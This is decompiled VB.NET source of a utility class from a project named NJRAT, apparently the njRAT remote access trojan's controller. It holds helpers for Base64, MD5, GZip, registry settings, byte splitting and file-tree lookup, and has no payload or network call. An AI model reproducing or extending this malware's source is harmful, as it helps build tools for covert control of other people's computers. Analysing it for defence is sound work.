Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.IO
Imports System.IO.Compression
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Text
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My

Namespace NJRAT
	' Token: 0x02000044 RID: 68
	Friend NotInheritable Class Class6
		' Token: 0x06000717 RID: 1815 RVA: 0x000020D7 File Offset: 0x000002D7
		<DebuggerNonUserCode()>
		Public Sub New()
		End Sub

		' Token: 0x06000718 RID: 1816
		Public Declare Function memcpy Lib "msvcrt.dll" (intptr_0 As IntPtr, intptr_1 As IntPtr, int_0 As Integer) As IntPtr

		' Token: 0x06000719 RID: 1817 RVA: 0x0003929C File Offset: 0x0003749C
		Public Shared Function smethod_0(int_0 As Integer, int_1 As Integer) As String
			Dim result As String
			If int_1 = 0 Then
				result = "%00.0"
			Else
				result = (Double.Parse(Conversions.ToString(int_0)) / Double.Parse(Conversions.ToString(int_1)) * 100.0 / 100.0).ToString("%00.0").Replace("100.0", "100")
			End If
			Return result
		End Function

		' Token: 0x0600071A RID: 1818 RVA: 0x00039300 File Offset: 0x00037500
		Public Shared Function smethod_1(int_0 As Integer, int_1 As Integer) As Integer
			Dim result As Integer
			If int_1 = 0 Then
				result = 0
			Else
				result = CInt(Math.Round(Math.Round(CDbl(int_0) / CDbl(int_1) * 100.0)))
			End If
			Return result
		End Function

		' Token: 0x0600071B RID: 1819 RVA: 0x00039334 File Offset: 0x00037534
		Public Shared Function smethod_10(string_0 As String) As Form
			Return MyProject.Application.OpenForms(string_0)
		End Function

		' Token: 0x0600071C RID: 1820 RVA: 0x00039354 File Offset: 0x00037554
		Public Shared Function smethod_11(ByRef string_0 As String) As Byte()
			Return Encoding.[Default].GetBytes(string_0)
		End Function

		' Token: 0x0600071D RID: 1821 RVA: 0x00039370 File Offset: 0x00037570
		Public Shared Function smethod_12(ByRef byte_0 As Byte()) As String
			Return Encoding.[Default].GetString(byte_0)
		End Function

		' Token: 0x0600071E RID: 1822 RVA: 0x0003938C File Offset: 0x0003758C
		Public Shared Function smethod_13() As String
			Return MyProject.Computer.Clock.LocalTime.ToString("[hh:mm:ss]")
		End Function

		' Token: 0x0600071F RID: 1823 RVA: 0x000393B8 File Offset: 0x000375B8
		Public Shared Function smethod_14(ByRef string_0 As String) As String
			Return Convert.ToBase64String(Encoding.UTF8.GetBytes(string_0))
		End Function

		' Token: 0x06000720 RID: 1824 RVA: 0x000393D8 File Offset: 0x000375D8
		Public Shared Function smethod_15(int_0 As Integer, int_1 As Integer, bool_0 As Boolean) As Integer
			Class6.long_0 = CLng(Math.Round(Math.Round(CDbl(Class6.long_0) + 333.33)))
			Dim random As Random = New Random(CInt(Class6.long_0))
			Return random.[Next](int_0, int_1 + 1)
		End Function

		' Token: 0x06000721 RID: 1825 RVA: 0x00039420 File Offset: 0x00037620
		Public Shared Function smethod_16(string_0 As String) As String
			Dim num As Integer = 0
			Dim result As String
			While True
				Try
					Dim bytes As Byte() = Convert.FromBase64String(string_0)
					result = Encoding.UTF8.GetString(bytes)
					Exit Try
				Catch ex As Exception
					num += 1
					If num = 3 Then
						result = Nothing
						Exit Try
					End If
					string_0 += "="
				End Try
			End While
			Return result
		End Function

		' Token: 0x06000722 RID: 1826 RVA: 0x00039498 File Offset: 0x00037698
		Public Shared Function smethod_17(long_1 As Long) As String
			Dim result As String
			If long_1.ToString().Length < 4 Then
				result = Conversions.ToString(long_1) + " Bytes"
			Else
				Dim str As String = String.Empty
				Dim num As Double = CDbl(long_1) / 1024.0
				If num < 1024.0 Then
					str = "KB"
				Else
					num /= 1024.0
					If num < 1024.0 Then
						str = "MB"
					Else
						num /= 1024.0
						str = "GB"
					End If
				End If
				result = num.ToString(".0") + " " + str
			End If
			Return result
		End Function

		' Token: 0x06000723 RID: 1827 RVA: 0x00039540 File Offset: 0x00037740
		Public Shared Function smethod_2(string_0 As String, string_1 As String) As String
			Dim result As String
			Try
				result = Conversions.ToString(RuntimeHelpers.GetObjectValue(MyProject.Computer.Registry.CurrentUser.OpenSubKey("Software\" + Class7.string_0).GetValue(string_0, string_1)))
			Catch ex As Exception
				result = string_1
			End Try
			Return result
		End Function

		' Token: 0x06000724 RID: 1828 RVA: 0x000395B4 File Offset: 0x000377B4
		Public Shared Sub smethod_3(string_0 As String, string_1 As String)
			If string_1 = Nothing Then
				string_1 = String.Empty
			End If
			Try
				MyProject.Computer.Registry.CurrentUser.CreateSubKey("Software\" + Class7.string_0).SetValue(string_0, string_1)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000725 RID: 1829 RVA: 0x00039624 File Offset: 0x00037824
		Public Shared Function smethod_4(string_0 As String) As String
			Return Class6.smethod_5(Class6.smethod_11(string_0))
		End Function

		' Token: 0x06000726 RID: 1830 RVA: 0x00039640 File Offset: 0x00037840
		Public Shared Function smethod_5(byte_0 As Byte()) As String
			byte_0 = New MD5CryptoServiceProvider().ComputeHash(byte_0)
			Dim text As String = String.Empty
			For Each b As Byte In byte_0
				text += b.ToString("x2")
			Next
			Return text
		End Function

		' Token: 0x06000727 RID: 1831 RVA: 0x00039690 File Offset: 0x00037890
		Public Shared Function smethod_6(int_0 As Integer) As String
			Dim random As Random = New Random()
			Dim text As String = String.Empty
			Dim text2 As String = "abcdefghijklmnopqrstuvwxyz"
			For i As Integer = 1 To int_0
				text += Conversions.ToString(text2(random.[Next](0, text2.Length)))
			Next
			Return text
		End Function

		' Token: 0x06000728 RID: 1832 RVA: 0x000396EC File Offset: 0x000378EC
		Public Shared Function smethod_7(string_0 As String, treeNodeCollection_0 As TreeNodeCollection) As TreeNode
			If string_0.EndsWith("\") Then
				string_0 = string_0.Remove(string_0.Length - 1, 1)
			End If
			Dim treeNode As TreeNode = Nothing
			For Each key As String In Strings.Split(string_0, "\", -1, CompareMethod.Binary)
				treeNode = treeNodeCollection_0(key)
				treeNodeCollection_0 = treeNode.Nodes
			Next
			Return treeNode
		End Function

		' Token: 0x06000729 RID: 1833 RVA: 0x00039754 File Offset: 0x00037954
		Public Shared Function smethod_8(byte_0 As Byte(), ByRef bool_0 As Boolean) As Byte()
			Dim result As Byte()
			If bool_0 Then
				Dim memoryStream As MemoryStream = New MemoryStream()
				Dim gzipStream As GZipStream = New GZipStream(memoryStream, CompressionMode.Compress, True)
				gzipStream.Write(byte_0, 0, byte_0.Length)
				gzipStream.Dispose()
				memoryStream.Position = 0L
				Dim array As Byte() = New Byte(CInt(memoryStream.Length) + 1 - 1 + 1 - 1) {}
				memoryStream.Read(array, 0, array.Length)
				memoryStream.Dispose()
				result = array
			Else
				Dim memoryStream2 As MemoryStream = New MemoryStream(byte_0)
				Dim gzipStream2 As GZipStream = New GZipStream(memoryStream2, CompressionMode.Decompress)
				Dim array2 As Byte() = New Byte(3) {}
				memoryStream2.Position = memoryStream2.Length - 5L
				memoryStream2.Read(array2, 0, 4)
				Dim num As Integer = BitConverter.ToInt32(array2, 0)
				memoryStream2.Position = 0L
				Dim array3 As Byte() = New Byte(num - 1 + 1 - 1 + 1 - 1) {}
				gzipStream2.Read(array3, 0, num)
				gzipStream2.Dispose()
				memoryStream2.Dispose()
				result = array3
			End If
			Return result
		End Function

		' Token: 0x0600072A RID: 1834 RVA: 0x0003984C File Offset: 0x00037A4C
		Public Shared Function smethod_9(byte_0 As Byte(), string_0 As String) As Array
			Dim list As List(Of Byte()) = New List(Of Byte())()
			Dim num As Integer = Array.IndexOf(Of Byte)(byte_0, CByte(Strings.Asc(string_0(0))))
			While num > -1 And num + string_0.Length <= byte_0.Length
				Dim array As Byte() = New Byte(string_0.Length - 1 + 1 - 1 + 1 - 1) {}
				Dim num2 As Integer = 0
				Dim num3 As Integer = num + string_0.Length - 1
				For i As Integer = num To num3
					array(num2) = byte_0(i)
					num2 += 1
				Next
				If Operators.CompareString(Class6.smethod_12(array), string_0, False) = 0 Then
					Dim memoryStream As MemoryStream = New MemoryStream()
					memoryStream.Write(byte_0, 0, num)
					list.Add(memoryStream.ToArray())
					memoryStream.Dispose()
					memoryStream = New MemoryStream()
					memoryStream.Write(byte_0, num + string_0.Length, byte_0.Length - (num + string_0.Length))
					list.Add(memoryStream.ToArray())
					memoryStream.Dispose()
					IL_10A:
					If list.Count = 0 Then
						list.Add(byte_0)
					End If
					Return list.ToArray()
				End If
				num = Array.IndexOf(Of Byte)(byte_0, CByte(Strings.Asc(string_0(0))), num + 1)
			End While
			GoTo IL_10A
		End Function

		' Token: 0x04000374 RID: 884
		Public Shared long_0 As Long = 0L
	End Class
End Namespace
